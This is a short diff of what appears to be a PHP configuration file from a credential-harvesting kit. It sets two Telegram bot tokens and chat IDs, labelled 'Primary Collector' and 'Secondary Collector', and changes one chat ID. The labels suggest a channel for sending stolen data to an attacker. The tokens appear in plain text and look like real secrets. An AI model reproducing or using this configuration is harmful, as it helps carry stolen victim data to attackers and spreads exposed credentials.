@@ -5,7 +5,7 @@
 
 // BOT 1 — Primary Collector
 $telegram_token_1 = "8568458304:AAEgrJKkRa0eDd2KhcKGtzFFLtKtZArkahY";
-$chat_id_1 = "6036275568";
+$chat_id_1 = "8568458304";
 
 // BOT 2 — Secondary Collector  
 $telegram_token_2 = "8832943565:AAGcI7DS4gWATLCUM78o3TSJVo5CBxCa-Wk";
